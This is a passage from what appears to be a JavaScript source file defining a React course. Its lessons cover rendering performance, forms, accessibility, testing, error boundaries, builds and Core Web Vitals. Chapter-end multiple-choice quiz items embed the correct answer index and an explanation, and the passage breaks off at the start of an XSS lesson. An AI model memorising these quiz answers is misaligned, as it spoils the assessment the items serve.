
### Re-render is not repaint

A re-render calls your function and produces a new element tree. React diffs it against the previous tree and touches the DOM only where they differ. For a component returning twenty elements with unchanged output, the cost is a function call and a diff — measured in microseconds. The expensive things are:

- Rendering **many** components (a 2,000-row table, not a 20-line card).
- Expensive work **inside** render — sorting 10,000 items, parsing markdown, formatting dates in a loop.
- Layout thrash — reading \`getBoundingClientRect\` and writing styles in the same pass.

Optimising a component that renders in 0.1 ms is not free: you add a comparison, a cache entry, and a dependency array that will go stale.

### Measure first, with real numbers

Open React DevTools, go to Profiler, tick "Record why each component rendered", and interact with the slow screen. You get a flamegraph with per-commit durations. Look for the widest bar, not the tallest one — depth is fine, width is time.

For a quick check in code:

\`\`\`jsx
import { Profiler } from 'react';

<Profiler id="ResultsTable" onRender={(id, phase, actualMs) => {
  if (actualMs > 16) console.warn(id, phase, actualMs.toFixed(1) + 'ms');
}}>
  <ResultsTable rows={rows} />
</Profiler>
\`\`\`

**16 ms** is the budget for one frame at 60 fps. Anything longer drops a frame; anything over roughly 100 ms feels like lag to the user. Those two numbers should decide whether you optimise at all.

### Fix the architecture before reaching for memo

Most re-render problems are state living too high. Moving it down is free and permanent, where memoisation is a running cost.

\`\`\`jsx
// BEFORE: every keystroke re-renders the whole page, including the heavy table
function Page() {
  const [query, setQuery] = useState('');
  return (
    <>
      <input value={query} onChange={e => setQuery(e.target.value)} />
      <ExpensiveTable rows={rows} />
    </>
  );
}

// AFTER: the state now lives in the only component that reads it
function SearchBox() {
  const [query, setQuery] = useState('');
  return <input value={query} onChange={e => setQuery(e.target.value)} />;
}

function Page() {
  return <><SearchBox /><ExpensiveTable rows={rows} /></>;
}
\`\`\`

When the state genuinely must stay high — a filter the table also needs — the children-as-props trick from Chapter 3 keeps the untouched subtree out of the re-render.

### Two more sources of avoidable work

**Expensive computation in the render body.** \`rows.filter(...).sort(...)\` on 20,000 items runs on every render, including renders caused by an unrelated toggle. That is the legitimate case for \`useMemo\`, next lesson.

**Uncontrolled render cascades from context.** A single provider holding fast-changing state re-renders every consumer. Split it, as Chapter 3 showed.

The order that works: measure, move state down, cut the number of rendered nodes, and only then memoise what remains.
        `),
        lesson('memo, useMemo, useCallback — and When Not To', 14, `
These three tools all trade memory and complexity for skipped work. They are worth it in specific situations and actively harmful everywhere else.

### React.memo skips a re-render caused by a parent

\`\`\`jsx
const Row = memo(function Row({ item, onSelect }) {
  return <tr onClick={() => onSelect(item.id)}><td>{item.name}</td></tr>;
});
\`\`\`

\`memo\` compares props shallowly with \`Object.is\`. If every prop is identical, React reuses the previous output. It changes nothing about renders caused by the component's own state or context.

### The bug that makes memo useless

\`\`\`jsx
function Table({ items }) {
  return items.map(item => (
    <Row
      key={item.id}
      item={item}
      onSelect={(id) => console.log(id)}      // new function every render
      style={{ padding: 8 }}                  // new object every render
    />
  ));
}
\`\`\`

Both props are new references on every render of \`Table\`, so the shallow compare fails and \`memo\` re-renders all 500 rows anyway — plus the cost of 500 failed comparisons. **A memoised component with an inline function or object prop is a memoised component that never memoises**, and it is the most common wasted optimisation in React codebases.

The fix is to stabilise the props:

\`\`\`jsx
function Table({ items }) {
  const handleSelect = useCallback((id) => { console.log(id); }, []);
  return items.map(item => (
    <Row key={item.id} item={item} onSelect={handleSelect} />
  ));
}
\`\`\`

Move the style object to a CSS class or hoist it to module scope. Constants do not belong inside a render function.

### useMemo caches a value, useCallback caches a function

\`\`\`jsx
// useMemo: skip an expensive computation when its inputs have not changed
const visible = useMemo(
  () => rows.filter(r => r.level === level).sort((a, b) => a.name.localeCompare(b.name)),
  [rows, level]
);

// useCallback(fn, deps) is exactly useMemo(() => fn, deps)
const onSave = useCallback(() => save(draft), [draft]);
\`\`\`

They serve two distinct purposes:

| Purpose | Example |
|---|---|
| Avoid recomputing something genuinely slow | Sorting 20,000 rows, parsing markdown |
| Keep a reference stable for memo, deps, or context | A callback passed to a memoised child |

If neither applies, skip it. \`useMemo(() => a + b, [a, b])\` costs more than the addition: an array allocation, a dependency comparison, and a cache slot, on every render, forever.

### The stale-closure trap

\`\`\`jsx
const submit = useCallback(() => {
  postForm(values);        // captures values from the render it was created in
}, []);                    // empty deps: values is frozen at mount
\`\`\`

Emptying the deps array to "make it stable" freezes every value the function reads. The form submits whatever was on screen at mount. Use the updater form of setters, keep changing values in a ref (Chapter 2), or accept the honest dependency.

### A decision rule you can apply in review

Reach for memoisation when **all** of these hold:

1. You measured a real problem — a commit over 16 ms, or a visible jank.
2. The component renders often, with a heavy subtree or a long list.
3. The props can actually be made stable.

Otherwise leave it out. Every \`useMemo\` is a dependency array that can go stale, and a wrong dependency array produces a bug that is much harder to find than a slow render.

### One note on the future

The React Compiler memoises components and values automatically at build time, based on real data flow rather than hand-written dependency arrays. Where it is enabled, most manual \`useMemo\` and \`useCallback\` becomes redundant. Write code that is correct first; the compiler cannot fix a stale closure you introduced to chase a phantom render.
        `),
        lesson('Code Splitting and List Virtualisation', 14, `
Two of the biggest wins in frontend performance are not about React at all: **ship less JavaScript**, and **render fewer DOM nodes**.

### Splitting the bundle

Every kilobyte in the initial bundle must be downloaded, parsed, and executed before the page is interactive. Parsing is the expensive part on a mid-range phone — roughly 1 MB of JavaScript costs about a second of CPU time before anything renders.

\`\`\`jsx
import { lazy, Suspense } from 'react';

const RichTextEditor = lazy(() => import('./RichTextEditor'));

function Notes({ editing }) {
  return editing
    ? <Suspense fallback={<EditorSkeleton />}><RichTextEditor /></Suspense>
    : <NotePreview />;
}
\`\`\`

\`lazy\` takes a function returning a dynamic \`import()\`, and the bundler emits a separate chunk fetched on first render. Wrap it in \`Suspense\` or React throws.

Where to split, in order of value:

1. **Routes** — the default split point (Chapter 3). No one should download the admin dashboard to read the home page.
2. **Heavy dependencies behind interaction** — editors, charts, PDF viewers, map libraries. A 300 KB charting library loaded only when a user opens the analytics tab.
3. **Below-the-fold widgets** — rarely worth it on its own.

Do not split small components. Each chunk is another request and another loading state; splitting a 4 KB modal makes the app slower and blinkier.

Run \`npx vite-bundle-visualizer\` (or \`source-map-explorer\` for CRA) before you guess. The usual finding is one accidental import — a whole date library imported for one \`format\` call, or an icon set imported as \`import * as Icons\`.

Preload on intent, so the chunk is warm before the click:

\`\`\`jsx
<Link to="/analytics" onMouseEnter={() => import('./routes/Analytics')}>
  Analytics
</Link>
\`\`\`

### Virtualisation: render the window, not the list

A 5,000-row table is 5,000 \`<tr>\` elements plus their children — easily 30,000 DOM nodes. The browser must lay out and paint all of them, memory climbs, and every re-render diffs the whole tree. Scrolling stutters badly on anything below a desktop.

Virtualisation renders only the rows inside the viewport plus a small overscan buffer, and positions them with a spacer of the full height so the scrollbar stays honest.

\`\`\`jsx
import { FixedSizeList } from 'react-window';

// Hoisted, for the reason Chapter 1 gave: a Row declared inside StudentList
// would be a new component type on every render, remounting every visible row.
// style carries the absolute positioning — always spread it onto the node.
const Row = ({ index, style, data }) => (
  <div style={style} className="row">{data[index].name}</div>
);

function StudentList({ students }) {
  return (
    <FixedSizeList
      height={600}          // visible height in px
      itemCount={students.length}
      itemData={students}   // reaches Row as its data prop
      itemSize={48}         // row height in px
      overscanCount={4}     // extra rows above and below, kills flicker
      width="100%"
    >
      {Row}
    </FixedSizeList>
  );
}
\`\`\`

For 5,000 students at 48 px in a 600 px viewport, that is about **13 rendered rows plus 8 overscan instead of 5,000** — a 99.6% cut in DOM nodes.

Forgetting to spread \`style\` onto the row is the classic mistake: every row stacks at the top of the container and the list appears empty below the first item.

### What virtualisation costs

- Rows must have a known or measurable height. Variable heights need \`VariableSizeList\` or a measuring library.
- Browser find-in-page only sees rendered rows.
- Anchor links and \`scrollIntoView\` into an unrendered row do not work without the library's scroll-to-item API.
- Accessibility needs care: keep a real \`role="list"\`/\`role="listitem"\` structure, and remember that a virtualised grid must still expose row and column counts.

Use it above roughly 200 rows, or sooner if each row is complex. Below that, pagination or a "load more" button is simpler and has none of these downsides.
        `),
      ],
      [
        q('Which does NOT on its own cause a component to re-render?', [
          'Its own state changed',
          'Its parent re-rendered',
          'A context it consumes changed value',
          'Its props are compared and found equal',
        ], 3, 'Equal props do not prevent a re-render — only React.memo does — and they never trigger one either.'),
        q('A memoised Row still re-renders 500 times. The parent passes onSelect={(id) => ...} inline. Why?', [
          'The inline function is a new reference each render, so the shallow prop comparison fails',
          'memo only works on class components',
          'The key prop is unstable',
          'memo requires a custom comparator',
        ], 0, 'React.memo compares props by identity; a freshly created function fails that check every single render.'),
        q('When is useMemo genuinely worth adding?', [
          'Around every derived value, as a habit',
          'Whenever a component has more than three props',
          'When the computation is measurably expensive or the reference must stay stable',
          'Only inside custom hooks',
        ], 2, 'Memoisation has a real cost, so it pays off only for expensive work or for identity that something else depends on.'),
        q('In react-window, forgetting to spread the style prop onto each row causes what?', [
          'Rows render with default browser styles',
          'All rows stack at the top because their absolute positioning is lost',
          'The list refuses to scroll',
          'Only the last row renders',
        ], 1, 'The library positions rows absolutely via that style object; without it every row sits at offset zero.'),
      ]
    ),
    chapter(
      'Forms, Accessibility, and Testing',
      'The three things that separate a demo from a product people can actually use and you can safely change.',
      [
        lesson('Forms and Validation', 14, `
Forms are where a React app meets reality: partial input, network failures, users on keyboards, and validation rules that change. Get the structure right and the rest is detail.

### Controlled and uncontrolled, and why it matters at scale

A **controlled** input reads its value from state, so React is the single source of truth. An **uncontrolled** input keeps its value in the DOM, and you read it on submit.

\`\`\`jsx
// Controlled — re-renders the form on every keystroke
<input value={email} onChange={e => setEmail(e.target.value)} />

// Uncontrolled — no re-render while typing
<input name="email" defaultValue="" ref={emailRef} />
\`\`\`

Controlled is right when you need live feedback: a character counter, dependent fields, or a filter that queries as you type. For a 30-field settings page, controlled inputs mean 30 fields re-rendering on every keystroke, which is exactly the problem Chapter 4 described.

**The switch that catches everyone:** \`value={undefined}\` makes an input uncontrolled, and setting it later throws the "A component is changing an uncontrolled input to be controlled" warning. Initialise with \`''\`, never \`null\` or \`undefined\`.

### A schema is the contract, used twice

Define validation once and share it between client and server:

\`\`\`js
import { z } from 'zod';

export const signupSchema = z.object({
  name: z.string().min(2, 'Name must be at least 2 characters'),
  email: z.string().email('Enter a valid email address'),
  password: z.string().min(8, 'Use at least 8 characters'),
  confirm: z.string(),
}).refine(d => d.password === d.confirm, {
  message: 'Passwords do not match',
  path: ['confirm'],          // attach the error to the right field
});
\`\`\`

### React Hook Form keeps typing cheap

\`\`\`jsx
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';

function SignupForm({ onDone }) {
  const {
    register, handleSubmit, setError,
    formState: { errors, isSubmitting },
  } = useForm({ resolver: zodResolver(signupSchema), mode: 'onTouched' });

  async function onSubmit(values) {
    const res = await fetch('/api/signup', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(values),
    });
    if (res.status === 409) {
      // Server-side truth wins — surface it on the field it belongs to
      return setError('email', { message: 'That email is already registered' });
    }
    if (!res.ok) return setError('root', { message: 'Something went wrong. Try again.' });
    onDone();
  }

  return (
    <form onSubmit={handleSubmit(onSubmit)} noValidate>
      <label htmlFor="email">Email</label>
      <input
        id="email"
        type="email"
        {...register('email')}
        aria-invalid={!!errors.email}
        aria-describedby={errors.email ? 'email-error' : undefined}
      />
      {errors.email && <p id="email-error" role="alert">{errors.email.message}</p>}

      <button type="submit" disabled={isSubmitting}>
        {isSubmitting ? 'Creating account…' : 'Create account'}
      </button>
    </form>
  );
}
\`\`\`

\`register\` wires the input as uncontrolled, so typing causes no re-render at all; the form re-renders only when validation state changes.

### The timing of errors is a design decision

Validating on every keystroke tells someone their email is invalid after the first character. \`mode: 'onTouched'\` waits until they first leave the field, then re-validates on every change after that — the pattern users find least hostile. Plain \`mode: 'onBlur'\` only ever validates on blur, so a field the user has just corrected keeps showing its error until they tab away again. Never validate only on submit for a long form; scrolling back up to find the problem is worse.

### Rules that hold everywhere

- **Never disable the submit button because the form is invalid.** The user gets no explanation and no way to trigger the error messages. Let them submit, then show what is wrong and move focus to the first invalid field.
- Do disable it while the request is in flight, and reflect that in the label, or you will get duplicate signups from double-clicks.
- Always pair \`<label htmlFor>\` with \`id\`. Placeholder text is not a label — it disappears when typing starts and is invisible to many screen readers.
- **Client validation is a convenience, not a defence.** Anyone can post directly to your endpoint, so the server validates the same schema again. That is not duplication; it is the only validation that actually protects your data.
        `),
        lesson('Accessibility in React', 13, `
Accessibility work in React is mostly about not undoing what HTML already does. Roughly 15% of people have a disability of some kind, keyboard users include anyone with a trackpad failure or an injury, and in many jurisdictions this is a legal requirement rather than a nice-to-have.

### The div-with-onClick problem

\`\`\`jsx
<div className="btn" onClick={save}>Save</div>
\`\`\`

That element cannot be focused with Tab, does not fire on Enter or Space, announces as "Save" with no role, and has no disabled state. Reproducing all of that takes \`tabIndex\`, \`role\`, two key handlers, and \`aria-disabled\` — or you can write:

\`\`\`jsx
<button type="button" onClick={save}>Save</button>
\`\`\`

The same applies to \`<a>\` for navigation, \`<input type="checkbox">\` for checkboxes, and \`<dialog>\` or a properly built modal for overlays. **The first rule of ARIA is not to use ARIA when a native element exists.**

Note \`type="button"\`: a \`<button>\` inside a form defaults to \`type="submit"\`, so an unlabelled "Cancel" button will submit the form. That bug ships constantly.

### Labels, names, and state

\`\`\`jsx
{/* Visible label — the default and the best option */}
<label htmlFor="search">Search courses</label>
<input id="search" type="search" />

{/* Icon-only control still needs an accessible name */}
<button aria-label="Close dialog" onClick={close}>
  <XIcon aria-hidden="true" />
</button>

{/* Communicate state, do not just style it */}
<button aria-expanded={isOpen} aria-controls="menu-panel">Menu</button>
\`\`\`

\`aria-hidden="true"\` on the decorative icon stops a screen reader announcing "X" after the real label.

### Focus is the thing React breaks

Because React swaps content without a page load, focus stays wherever it was — often on a button that no longer exists, which drops focus to \`<body>\` and strands keyboard and screen-reader users at the top of nowhere.

\`\`\`jsx
// Move focus to the new page heading after a route change
function RouteAnnouncer() {
  const { pathname } = useLocation();
  const headingRef = useRef(null);

  useEffect(() => { headingRef.current?.focus(); }, [pathname]);

  return <h1 ref={headingRef} tabIndex={-1}>{titleFor(pathname)}</h1>;
}
\`\`\`

\`tabIndex={-1}\` makes an element programmatically focusable without adding it to the tab order.

Modals need three things: focus moves into the dialog on open, Tab is trapped inside it, and focus returns to the trigger on close. Use \`<dialog>\`'s \`showModal()\` or a library like Radix — hand-rolled focus traps are almost always subtly wrong.

### Announce what changes asynchronously

\`\`\`jsx
<div role="status" aria-live="polite">
  {isPending ? 'Loading results' : \`\${results.length} results found\`}
</div>
\`\`\`

Without a live region, a sighted user sees the results update and a screen-reader user hears silence. Use \`polite\` for status, \`assertive\` only for genuine errors.

### Numbers to hold yourself to

| Requirement | Threshold |
|---|---|
| Body text contrast | 4.5:1 against its background |
| Large text (18.66px bold / 24px) | 3:1 |
| Interactive control contrast | 3:1 for borders and focus rings |
| Touch target | 44 × 44 CSS pixels |

Never ship \`outline: none\` without a replacement focus style. That one line removes the only cue a keyboard user has about where they are.

### A five-minute audit

Unplug the mouse and Tab through the page: can you reach and operate everything, and always see where you are? Then run \`axe\` DevTools, or add it to your test suite:

\`\`\`js
import { axe } from 'jest-axe';
const { container } = render(<SignupForm />);
expect(await axe(container)).toHaveNoViolations();
\`\`\`

Automated tools catch about 30–40% of issues — contrast, missing labels, bad ARIA. The keyboard pass catches most of the rest.
        `),
        lesson('Testing with React Testing Library', 15, `
The guiding principle of React Testing Library is one sentence: **the more your tests resemble the way your software is used, the more confidence they give you.** Practically, that means you test what a user can see and do, never the internals.

### Setup and a first test

\`\`\`jsx
import { render, screen } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import Counter from './Counter';

test('increments when the button is pressed', async () => {
  const user = userEvent.setup();
  render(<Counter />);

  const button = screen.getByRole('button', { name: /increment/i });
  await user.click(button);

  expect(screen.getByText('Count: 1')).toBeInTheDocument();
});
\`\`\`

Note what is absent: no reference to \`useState\`, no shallow rendering, no checking that a handler "was called". Rewrite \`Counter\` to use \`useReducer\` and this test still passes — which is the entire point.

### Query priority, in order

1. \`getByRole('button', { name })\` — how assistive technology sees the page. Default choice.
2. \`getByLabelText\` — form fields, and it fails if the label is not wired up, catching a real bug.
3. \`getByText\` — non-interactive content.
4. \`getByTestId\` — last resort, when nothing user-visible identifies the element.

Reaching for \`getByTestId\` first means your test cannot tell you whether the button is reachable, named, or labelled. If \`getByRole\` cannot find your control, that is usually the test reporting an accessibility bug from the previous lesson, not an inconvenience to work around.

### get, query, find — pick deliberately

| Prefix | Behaviour | Use for |
|---|---|---|
| \`getBy\` | Throws if not found | Something that must be there now |
| \`queryBy\` | Returns null | Asserting absence |
| \`findBy\` | Async, retries until timeout | Something that appears later |

\`\`\`jsx
expect(screen.queryByRole('alert')).not.toBeInTheDocument();   // absence
expect(await screen.findByText('Saved')).toBeInTheDocument();  // after async work
\`\`\`

Using \`getBy\` for something that arrives after a fetch is the most common failure in React test suites — it throws instantly because the assertion runs before the promise resolves. \`findBy\` retries.

### userEvent, not fireEvent

\`fireEvent.change(input, { target: { value: 'hi' } })\` dispatches one synthetic event. \`user.type(input, 'hi')\` fires focus, keydown, keypress, input, and keyup per character — and respects \`disabled\`, \`pointer-events: none\`, and focus order. Tests that pass with \`fireEvent\` and fail with \`userEvent\` are usually revealing a real bug.

### Mock the network, not your modules

\`\`\`jsx
import { http, HttpResponse } from 'msw';
import { setupServer } from 'msw/node';

const server = setupServer(
  http.get('/api/courses', () => HttpResponse.json([{ id: 1, title: 'React' }]))
);

beforeAll(() => server.listen());
afterEach(() => server.resetHandlers());
afterAll(() => server.close());

test('shows an error when the request fails', async () => {
  server.use(http.get('/api/courses', () => new HttpResponse(null, { status: 500 })));
  render(<CourseList />);
  expect(await screen.findByRole('alert')).toHaveTextContent(/could not load/i);
});
\`\`\`

Intercepting at the network layer means the component's real fetch code runs. Mocking your own \`api.js\` module tests that you called a function you wrote, which proves nothing about whether the request is right.

### Render with the providers the component needs

\`\`\`jsx
function renderWithProviders(ui, { route = '/' } = {}) {
  const client = new QueryClient({ defaultOptions: { queries: { retry: false } } });
  return render(
    <QueryClientProvider client={client}>
      <MemoryRouter initialEntries={[route]}>{ui}</MemoryRouter>
    </QueryClientProvider>
  );
}
\`\`\`

\`retry: false\` matters: default retries make a failing-request test hang until it times out.

### What is worth testing

Test the behaviour a user depends on: the empty state, the error state, that a form submits the right values, that validation messages appear, that a disabled action stays disabled. Do not test that a \`<p>\` has a particular class, or that a child component "received prop x" — those tests break on every refactor and catch nothing. A test suite you are afraid to change is worse than no suite at all.
        `),
      ],
      [
        q('Why should you avoid disabling a submit button while the form is invalid?', [
          'Disabled buttons cannot be styled',
          'React cannot re-enable it reliably',
          'The user gets no explanation of what is wrong and no way to trigger the messages',
          'It prevents validation from running',
        ], 2, 'Blocking submission hides the reason; letting them submit and then showing focused errors is far more usable.'),
        q('An input starts as value={undefined} and later receives a string. What happens?', [
          'Nothing — React treats undefined as an empty string',
          'The form cannot be submitted',
          'The input becomes read-only',
          'React warns that an uncontrolled input became controlled',
        ], 3, 'undefined makes the input uncontrolled, so supplying a value later switches its mode — initialise with an empty string.'),
        q('A route change leaves keyboard focus on a button that no longer exists. Best fix?', [
          'Scroll to the top of the page',
          'Move focus to the new page heading, given tabIndex={-1}',
          'Add aria-live to the layout',
          'Re-render the navigation',
        ], 1, 'Focus must be moved deliberately after client-side navigation, and tabIndex={-1} lets a heading receive it programmatically.'),
        q('A test asserts on text that appears after a fetch resolves and fails immediately. What is wrong?', [
          'It uses getBy instead of findBy',
          'render() must be awaited',
          'userEvent needs setup()',
          'The component is missing a key',
        ], 0, 'getBy queries throw synchronously; findBy retries until the element appears or the timeout expires.'),
      ]
    ),
    chapter(
      'Shipping to Production',
      'Failing gracefully, building for a real environment, and the loading metrics users actually feel.',
      [
        lesson('Error Boundaries and Graceful Failure', 13, `
One \`undefined.map\` anywhere in your tree does not break one component. Since React 16 it unmounts the **entire application** and leaves a white screen, taking the user's half-written form with it. An error boundary is the only thing that stops that.

### A boundary is still a class component

\`\`\`jsx
class ErrorBoundary extends React.Component {
  state = { error: null };

  static getDerivedStateFromError(error) {
    return { error };            // render the fallback on the next render
  }

  componentDidCatch(error, info) {
    // info.componentStack names the subtree that threw
    reportToMonitoring(error, info.componentStack);
  }

  render() {
    if (this.state.error) {
      return this.props.fallback ?? <p role="alert">Something went wrong.</p>;
    }
    return this.props.children;
  }
}
\`\`\`

There is no hook equivalent — this is the one place a class is still required — so most teams install \`react-error-boundary\` and never write the class themselves.

### What a boundary does not catch

A boundary catches errors thrown during **render**, in **lifecycle methods**, and in constructors of the tree below it. It does not catch:

- errors in event handlers,
- anything asynchronous — \`setTimeout\`, a \`.then\` callback, a rejected \`fetch\`,
- errors thrown by the boundary's own render,
- errors during server rendering.

\`\`\`jsx
// NOT caught: React finished rendering long before this runs
<button onClick={async () => { const r = await fetch(url); setData(await r.json()); }}>Load</button>
\`\`\`

The classic bug follows directly: a team wraps a data screen in a boundary, deletes the local error state as "handled", and ships a page that spins forever when the API is down. A rejected promise is not a render error. Keep the error in state (Chapter 3's \`isError\`), or promote it to a render error deliberately:

\`\`\`jsx
if (error) throw error;   // now the boundary can see it
\`\`\`

### Place them where the page can survive

One boundary at the root is only a nicer white screen. Put boundaries where the surrounding page is still useful without the broken part: around each route, and around independent widgets — a chart, a comments panel, a third-party embed. A failed recommendations sidebar should never take the checkout form with it.

### Give the user a way out

\`\`\`jsx
import { ErrorBoundary } from 'react-error-boundary';

function Fallback({ error, resetErrorBoundary }) {
  return (
    <div role="alert" className="panel">
      <h2>This section could not load</h2>
      <p>{error.message}</p>
      <button onClick={resetErrorBoundary}>Try again</button>
    </div>
  );
}

<ErrorBoundary
  FallbackComponent={Fallback}
  resetKeys={[courseId]}                 // clears itself when the route changes
  onReset={() => qc.resetQueries({ queryKey: ['course', courseId] })}
>
  <CourseDetail id={courseId} />
</ErrorBoundary>
\`\`\`

Without \`resetKeys\` or a reset button, a boundary that trips once stays tripped for the rest of the session — the user navigates to a different record and still sees the error from the old one, because the boundary's state never cleared.

### Catch everything else globally

\`\`\`js
window.addEventListener('error', e => report(e.error));
window.addEventListener('unhandledrejection', e => report(e.reason));
\`\`\`

That is the safety net for the four cases above. Report, do not swallow: an empty \`catch\` is how a bug survives for months.

### Fallbacks are user interface

Give the fallback \`role="alert"\` so screen readers announce it (Chapter 5), keep it inside your layout so navigation still works, and never print a raw stack trace at a user. Show what failed, offer retry, and send the technical detail to your monitoring tool.
        `),
        lesson('Builds, Environments, and Source Maps', 14, `
The dev server and the production build are two different programs. Dev serves unbundled ES modules with hot reload and readable names; \`npm run build\` emits a minified, tree-shaken, content-hashed bundle. Almost every "worked on my machine" bug lives in that gap.

### What a production build emits

\`\`\`
dist/
  index.html                  # tiny, points at the hashed files
  assets/index-B7dK2p.js      # your app, minified
  assets/vendor-9fQ1xa.js     # dependencies, split out
  assets/index-4mZq0s.css
\`\`\`

The hash comes from the file's contents, so any change produces a new filename. That gives you a caching rule with no invalidation problem:

| File | Cache-Control |
|---|---|
| \`assets/*\` (hashed) | \`public, max-age=31536000, immutable\` |
| \`index.html\` | \`no-cache\` |

Get it backwards — caching \`index.html\` for a year — and returning users load an old HTML file pointing at chunks you have already deleted. The symptom is a blank page and \`Failed to fetch dynamically imported module\` after every deploy.

### Environment variables are compile-time text substitution

\`\`\`js
// .env.production
VITE_API_URL=https://api.example.com
\`\`\`

\`\`\`js
const res = await fetch(\`\${import.meta.env.VITE_API_URL}/courses\`);
\`\`\`

Vite exposes only variables prefixed \`VITE_\` (Create React App uses \`REACT_APP_\`). That prefix is a guard rail, not a security boundary. **Anything client code references is inlined as a literal string into a file the whole internet downloads.** Open the built JS in a text editor and search for the value; it is right there.

Base URLs, publishable keys, feature flags, analytics ids: fine. Stripe secret keys, database passwords, admin tokens: never — the browser asks your server, and your server holds the secret.

The second surprise is timing. Substitution happens at **build** time, not at boot, so restarting a container with a new \`API_URL\` changes nothing. Either build once per environment, or fetch a \`/config.json\` at runtime.

### A config that covers the everyday cases

\`\`\`js
// vite.config.js
export default defineConfig({
  plugins: [react()],
  base: '/',                       // '/app/' when deployed in a subdirectory
  build: { sourcemap: 'hidden' },  // emit maps, do not link them from the bundle
  server: {
    proxy: { '/api': { target: 'http://localhost:4000', changeOrigin: true } },
  },
});
\`\`\`

The \`proxy\` line makes the app and the API share an origin in development, so CORS never appears locally — which is exactly why CORS errors feel like they only happen in production (Chapter 7).

### Source maps keep minified traces readable

\`Cannot read properties of undefined (reading 'map') at n (index-B7dK2p.js:1:48213)\` tells you nothing. A source map turns it back into your file and line. Emit them, upload them to your error tracker as a deploy step, and use \`'hidden'\` so browsers do not fetch them from your public server.

### Before the first deploy

- Run \`npm run build && npm run preview\` and click through the real bundle locally.
- Confirm the SPA rewrite from Chapter 3, or refreshing a deep link 404s.
- Check import casing. \`./components/navbar\` resolves on a case-insensitive Mac and fails on a Linux build agent — the single most common cause of a build that passes locally and dies in CI.
- Set every \`VITE_\` variable in CI as well as in your local \`.env\`. A missing one becomes \`undefined\` inside a template string and produces requests to \`undefined/courses\`.
        `),
        lesson('Core Web Vitals in a React App', 14, `
Chapter 4 optimised the render loop. **Core Web Vitals** measure what the person holding the phone experiences, which is a different question and the one search engines report on.

| Metric | Measures | Good | Poor |
|---|---|---|---|
| **LCP** | When the largest element in the viewport paints | ≤ 2.5 s | > 4 s |
| **INP** | Worst interaction-to-next-paint across the visit | ≤ 200 ms | > 500 ms |
| **CLS** | How much visible content shifts unexpectedly | ≤ 0.1 | > 0.25 |

Lighthouse gives lab numbers from your laptop. Field data from real devices is what counts:

\`\`\`js
import { onLCP, onINP, onCLS } from 'web-vitals';

function send(metric) {
  navigator.sendBeacon('/api/vitals', JSON.stringify({
    name: metric.name, value: metric.value, path: location.pathname,
  }));
}
onLCP(send); onINP(send); onCLS(send);
\`\`\`

Track the **75th percentile**, never the mean — vitals are a distribution, and an average hides the quarter of your users having a bad time.

### LCP: paint the biggest thing early

\`\`\`jsx
{/* The hero: never lazy, always prioritised */}
<img src={hero} width={1200} height={630} fetchPriority="high" alt="" />

{/* Below the fold: the opposite */}
<img src={thumb} width={320} height={180} loading="lazy" decoding="async" alt="" />
\`\`\`

Then keep the LCP element out from behind JavaScript. A route-level \`lazy()\` chunk (Chapter 3) on the landing page forces the browser to download, parse and execute your bundle before the hero can exist. Split the admin screens, not the front door. Finally, fonts: \`font-display: swap\` paints text immediately in a fallback face, and preconnecting to the font host saves a round trip.

\`\`\`html
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
\`\`\`

### CLS: reserve the space before the content lands

Every image needs intrinsic dimensions — \`width\` and \`height\` attributes, or \`aspect-ratio\` in CSS. Without them the browser lays out at zero height and reflows when the bytes arrive, jolting everything below.

The React-specific version is a skeleton that is not the size of the thing it replaces:

\`\`\`jsx
// BAD: 20px of text becomes a 260px card, and the page jumps
if (isPending) return <p>Loading…</p>;

// GOOD: the placeholder occupies the final layout
if (isPending) return <div className="card-skeleton" style={{ minHeight: 260 }} />;
\`\`\`

The other classic is a cookie banner, promo bar or ad injected **above** existing content after paint. Reserve its height from the first render, or take it out of the flow with fixed positioning.

### INP: keep the main thread free

INP replaced FID in 2024 and is the strictest of the three, because it samples every interaction rather than the first. One 300 ms task — filtering 20,000 rows on each keystroke — fails it on its own.

\`\`\`jsx
function CourseSearch({ courses }) {
  const [query, setQuery] = useState('');
  const deferred = useDeferredValue(query);   // deliberately lags behind

  const results = useMemo(
    () => courses.filter(c => c.title.toLowerCase().includes(deferred.toLowerCase())),
    [courses, deferred]
  );

  return (
    <>
      <input value={query} onChange={e => setQuery(e.target.value)} />
      <ResultList items={results} isStale={query !== deferred} />
    </>
  );
}
\`\`\`

The input updates in the urgent render; the expensive list re-renders in a low-priority pass React can interrupt and restart. \`useTransition\` does the same for state you set yourself:

\`\`\`jsx
const [isPending, startTransition] = useTransition();
startTransition(() => setTab(next));   // the click stays instant
\`\`\`

Neither makes the work faster — they change *when* it blocks. If the list is still slow, remove work: virtualise it (Chapter 4), debounce the request (Chapter 2), or filter on the server.

### The mistake to avoid

Tuning until Lighthouse says 100 on a desktop with fibre. Throttle DevTools to Slow 4G with a 4× CPU slowdown, or read your field data. That is the device most of your users are actually holding.
        `),
      ],
      [
        q('A rejected fetch inside an onClick handler leaves the screen spinning, even though the component sits inside an error boundary. Why?', [
          'The boundary is missing componentDidCatch',
          'Boundaries only catch errors thrown while rendering, in lifecycle methods, or in constructors',
          'The fallback prop was not provided',
          'Async errors need react-error-boundary instead of a class',
        ], 1, 'Event handlers and promises run outside the render phase, so their errors never reach a boundary unless you rethrow during render.'),
        q('VITE_API_KEY is defined in .env and read through import.meta.env. Where does the value end up?', [
          'Only on the build machine',
          'Encrypted inside the bundle',
          'Read at runtime from the hosting provider',
          'Inlined as a plain string in the JavaScript every visitor downloads',
        ], 3, 'Client env vars are compile-time text substitution, so anything referenced from browser code is public by definition.'),
        q('Images shipped without width and height attributes mainly damage which metric?', [
          'CLS, because the layout reflows once the real dimensions arrive',
          'LCP, because the image downloads more slowly',
          'INP, because decoding blocks the main thread',
          'TTFB, because the server responds later',
        ], 0, 'Reserving the space up front prevents the reflow that pushes already-painted content down the page.'),
        q('Typing into a filter over 20,000 rows makes the input stutter. Which API is designed for exactly this?', [
          'useLayoutEffect around the filter',
          'React.memo on every row',
          'useDeferredValue, so the input stays urgent while the list re-renders at low priority',
          'A second useState for the filtered array',
        ], 2, 'Deferring the expensive value lets React interrupt the heavy render to keep keystrokes responsive.'),
      ]
    ),
    chapter(
      'Security and Debugging',
      'The attacks that reach the browser, the tokens you must not leak, and how to find a bug you cannot reproduce.',
      [
        lesson('XSS and Trusted Output', 13, `
